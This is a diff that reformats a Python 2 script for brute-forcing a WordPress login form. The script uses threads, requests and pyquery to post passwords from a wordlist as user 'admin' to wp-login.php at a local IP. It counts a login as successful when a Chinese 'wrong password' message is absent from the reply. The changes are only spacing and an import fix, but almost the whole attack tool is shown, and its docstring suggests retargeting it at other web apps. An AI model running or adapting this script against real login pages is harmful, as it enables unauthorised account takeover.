@@ -1,28 +1,31 @@
 #!/usr/bin/python
-#coding=utf-8
+# coding=utf-8
 
 import requests
 import Queue
 import threading
 import sys
 from pyquery import PyQuery as pq
-from dir_bruster import build_wordlist
+from dir_bruter import build_wordlist
 
 thread_count = 10
-#login form url
+# login form url
 target_url = 'http://192.168.99.196/wordpress/wp-login.php'
-#login form action url
+# login form action url
 target_post = 'http://192.168.99.196/wordpress/wp-login.php'
 username_field = 'log'
 password_field = 'pwd'
 username = 'admin'
 wordlist = build_wordlist('./pwd.txt')
 
+
 class Bruster(object):
-'''
-    Brute web form using requests and pyquery
-    This example is for wordpress, you can change these global params to brute other web app:)
-'''
+
+    '''
+        Brute web form using requests and pyquery
+        This example is for wordpress, you can change these global params to brute other web app:)
+    '''
+
     def __init__(self, username, wordlist):
         self.username = username
         self.wordlist = wordlist
@@ -32,7 +35,7 @@ class Bruster(object):
         for n in range(thread_count):
             t = threading.Thread(target=self.brust_form)
             t.start()
-    
+
     def brust_form(self):
         while not self.wordlist.empty() and not self.found:
             pwd = self.wordlist.get()
@@ -43,7 +46,8 @@ class Bruster(object):
                 body[username_field] = self.username
                 body[password_field] = pwd
 
-                print('Trying %s:%s (%d left)' % (self.username, pwd, self.wordlist.qsize()))
+                print('Trying %s:%s (%d left)' %
+                      (self.username, pwd, self.wordlist.qsize()))
                 result = s.post(target_post, data=body)
                 if '密码不正确' not in result.content:
                     self.found = True
@@ -64,6 +68,7 @@ class Bruster(object):
             if n.value is not None:
                 body[n.name] = n.value
         return body
+
 
 b = Bruster(username, wordlist)
 b.run_brust()
